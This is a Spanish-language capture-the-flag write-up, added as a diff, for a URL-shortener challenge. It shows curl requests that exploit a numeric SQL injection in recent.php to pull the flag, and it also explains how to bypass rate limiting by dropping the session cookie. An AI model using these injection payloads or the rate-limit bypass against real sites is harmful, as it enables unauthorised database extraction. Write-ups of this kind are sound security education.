@@ -1,0 +1,105 @@
+Al entrar en http://shortener.ctf.noconname.org nos encontramos con un acortador
+de URLs. Es de suponer que el flag estará oculto en alguna de las URLs.
+
+Según el banner está basado en phurl versión 2.4.2, esto es útil porque
+nos permite ver el código fuente. Esto lo usaremos luego.
+
+La solución más simple sería un ataque por fuerza bruta, el principal problema
+aquí es que tardaría mucho tiempo. Para esto vemos en el código fuente la manera
+en que se generan las URLs acortadas. Esta es la función que genera los códigos
+del acortador:
+
+function generate_code($number) {
+    $out   = "";
+    $codes = "abcdefghjkmnpqrstuvwxyz23456789ABCDEFGHJKMNPQRSTUVWXYZ";
+
+    while ($number > 53) {
+        $key    = $number % 54;
+        $number = floor($number / 54) - 1;
+        $out    = $codes{$key}.$out;
+    }
+
+    return $codes{$number}.$out;
+}
+
+Básicamente convierte un número entero secuencial (que comienza por 0, como se
+ve en phurl.sql) en un número en base 54 usando como dígitos una serie de letras
+y números, eliminando aquellos que visualmente sean similares, suponemos que por
+una cuestión de legibilidad (se han eliminado los números "0" y "1" y las letras
+"i", "l" y "o"). Con esto podemos generar todas las URLs acortadas, podemos
+empezar desde el principio (http://shortener.ctf.noconname.org/a) o podemos
+crear una URL nueva, mirar el código que genera, y hacer el bruteforce de atrás
+para adelante.
+
+Al intentar esto es posible que nos topemos con un problema: al intentar hacer
+muchas peticiones HTTP muy rápido, es posible que el servicio nos bloquee con
+un error 429 (Too Many Requests). Esto es fácil de saltear, simplemente hay que
+omitir la cookie PHPSESSID que es la que se está utilizando para determinar que
+las peticiones vienen del mismo sitio. Esto nos va a pasar si usamos Burp para
+realizar el ataque, si hacemos un script con Bash y Curl no vamos a tener ese
+problema porque las cookies no se envían nunca.
+
+Aún así, viendo cual es la última URL generada por el acortador sabemos que debe
+haber aproximadamente medio millón de entradas en la base de datos, con lo que
+sacarlas por este medio puede llegar a tardar bastante. Debe haber alguna forma
+mejor de resolver esto!
+
+Comparando el fuente vemos que hay algunas diferencias, en particular la sección
+"Recent shortened URLs" es nueva. Mirando un poco el código vemos que hay una
+llamada con jQuery para pedir la lista de URLs recientes, se hace a un fichero
+"html/recent.php" que también es nuevo con respecto a la versión pública.
+
+Vemos que se le pasa un parámetro "n" con un timestamp de Unix correspondiente
+a la fecha y hora actual en el navegador. Qué pasa si le cambiamos el valor a
+cero?
+
+$ curl http://shortener.ctf.noconname.org/html/recent.php?n=0
+<ul>
+<li><a href=http://shortener.ctf.noconname.org/ncn>http://www.noconname.org/</a></li>
+<li><a href=http://shortener.ctf.noconname.org/hacker>http://news.ycombinator.com/</a></li>
+<li><a href=http://shortener.ctf.noconname.org/hipster>http://instagram.com/</a></li>
+<li><a href=http://shortener.ctf.noconname.org/caralibro>http://facebook.com/</a></li>
+<li><a href=http://shortener.ctf.noconname.org/aliens>http://truthism.com/</a></li>
+</ul>
+
+Bien, esto nos permite obtener siempre las últimas 5 URLs sin importar cuando se
+hayan creado, pero querríamos poder leerlas todas. Probemos si hay algún tipo de
+inyección SQL...
+
+l$ curl http://shortener.ctf.noconname.org/html/recent.php?n=%27
+File: /var/www/html/recent.php<br />Line: 14<br />Message: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') ORDER BY id DESC LIMIT 5' at line 1
+
+Ajá! No es la típica inyección SQL con una cadena, sino que el valor se supone
+numérico pero no ha sido casteado con (int) para asegurarse de que lo sea. Por
+lo tanto lo que debemos cerrar es ese paréntesis. También sabemos por el mensaje
+de error que debemos tener una base de datos MySQL.
+
+Veamos qué ocurre si le pasamos un argumento que no sea numérico...
+
+$ curl http://shortener.ctf.noconname.org/html/recent.php?n=aaaaa
+File: /var/www/html/recent.php<br />Line: 14<br />Message: Unknown column 'aaaaa' in 'where clause'
+
+$ curl http://shortener.ctf.noconname.org/html/recent.php?n=0%20a
+File: /var/www/html/recent.php<br />Line: 14<br />Message: Incorrect parameters in the call to native function 'FROM_UNIXTIME'
+
+Ya nos vamos haciendo una idea de cómo es el query. Seguramente sea un SELECT
+con una cláusula WHERE donde se convierte el timestamp de Unix en un valor de
+fecha que MySQL comprenda. El final del query es visible, se ordenan las filas
+por orden descendiente y se leen sólo los primeros cinco resultados. Por lo
+tanto lo que queremos es usar el timestamp 0 para que todas las fechas sean
+posteriores y eliminar el LIMIT para dumpear toda la base de datos.
+
+$ curl http://shortener.ctf.noconname.org/html/recent.php?n=0%29%3B%23
+File: /var/www/html/recent.php<br />Line: 17<br />Message: Dude, seriously? Are you trying to dump the whole database? C'mon, you can make a smarter query!
+
+Y sí, es verdad, dumpear la base de datos completa es un poco bruto :D pero
+podemos cambiar la query para que la propia base de datos busque el flag por
+nosotros.
+
+$ curl http://shortener.ctf.noconname.org/html/recent.php?n=0%29%20and%20url%20like%20%27%25NCN%25%27%20%3B%20%23
+<ul>
+<li><a href=http://shortener.ctf.noconname.org/66e5cc7bda67a3c64d12fb42e68b5f42bec1737e>ncn://NCN66e5cc7bda67a3c64d12fb42e68b5f42bec1737e</a></li>
+</ul>
+
+Y finalmente obtenemos el flag, NCN66e5cc7bda67a3c64d12fb42e68b5f42bec1737e.
+
